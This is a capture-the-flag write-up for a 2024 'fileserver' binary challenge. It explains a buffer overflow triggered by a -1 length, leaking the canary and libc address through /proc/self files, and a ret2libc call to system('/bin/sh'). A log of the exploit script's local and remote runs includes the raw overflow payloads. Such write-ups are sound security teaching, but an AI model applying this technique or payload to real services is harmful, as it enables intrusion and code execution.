Fileserver challange - 2024 
===============================

The binary has a buffer overrun bug that can be triggered by viewing a file and setting the length to -1.
Since we can read /proc/self/fd/0 (STDIN), it is possible input data and overflow the buffer (144 bytes).
However, first download the binary by reading the file /proc/self/exe (the ELF of the current process binary).

After that, we can run it locally and also examine the code by using objdump -d binary.bin.

It is not possible to just overflow the buffer and set a new return address because of stack-smashing protection. Stack-smashing protection uses a canary byte (in this case, it is three bytes + 00). The canary byte is placed between the buffer on the stack and the return address - when the function exits, it checks that the canary byte is intact. So, we have to find the canary byte and include it in the payload.

Get the canary byte from /proc/self/auxv. The AUXV vectors are useful:
 - 25 is AT_RANDOM = canary byte
 - 7 is the address of the LD-library
 - 9 is the entry point in the running binary.
   
Calculate the address of libc. The start addresses of ld and libc change between different executions of the program. BUT... It turns out that the distance between the LD-library (linker) and the LIBC is constant. In my case, it's 0x23900 on the remote machine and 0x24000 on my local machine. It is possible to find the distance between libc and ld by running /proc/self/maps.
Once the canary byte is known and we have the address of libc, a shellcode can be constructed and passed to the remote host.
Use 'cat flag' to retrieve the flag!

```
>> python3 fileserver.py 
[*] '/usr/lib32/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to localhost on port 5554: Done
b'(1) Read file\n(2) [DEBUG] Read mem\nChoice: '
  conn.sendline(path)
--> b'Filename: '
[+] Receiving all data: Done (15.50KB)
[*] Closed connection to localhost port 5554
-- binary saved to {filename}
[*] '/root/basic/fileserver/exe'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 === LOCAL RUN === 
[+] Starting local process '/root/basic/fileserver/exe': pid 14664
b'(1) Read file\n(2) [DEBUG] Read mem\nChoice: '
b'Filename: '
Found ld-adress: 0xf7f78000
Calculated libc-adress: 0xf7d38000
Found AT_RANDOM (canary byte): 0xffe9055b
b'Addr: '
0x7fffffe9055b
0x294584ac 0x8f63f692 0xc790ddd9 0x86e992f5 0x69363836 0x00000000 0x00000000 0x00000000
canary: 2894349568
b'Filename: '
b'nr of bytes: '
=== Create payload - libc-addr: 0xf7d38000
canary hex: 0xac844500
binsh: 0xf7ef10d5
system: 0xf7d7fcd0
Sending payload...
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00E\x84\xacBBBBBBBB\x00\x00\x00\x00\xd0\xfc\xd7\xf7\x00\x00\x00\x00\xd5\x10\xef\xf7\n\nEOF /proc/self/fd/0\n'
b'flaggans-v\xc3rde!\n'
[*] Stopped process '/root/basic/fileserver/exe' (pid 14664)
 === REMOTE RUN === 
[+] Opening connection to localhost on port 5554: Done
b'(1) Read file\n(2) [DEBUG] Read mem\nChoice: '
b'Filename: '
Found ld-adress: 0xf7ee8000
Calculated libc-adress: 0xf7caf000
Found AT_RANDOM (canary byte): 0xffd7abdb
b'Addr: '
0x7fffffd7abdb
0xebd952f2 0xba95167e 0x13e34164 0xfb46ca87 0x69363836 0x00000000 0x00000000 0x00000000
canary: 4065515776
b'Filename: '
b'nr of bytes: '
=== Create payload - libc-addr: 0xf7caf000
canary hex: 0xf252d900
binsh: 0xf7e680d5
system: 0xf7cf6cd0
Sending payload...
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xd9R\xf2BBBBBBBB\x00\x00\x00\x00\xd0l\xcf\xf7\x00\x00\x00\x00\xd5\x80\xe6\xf7\n\nEOF /proc/self/fd/0\n'
b'undut{XXXX-XXXXX-XXX-XXX}\n'
```
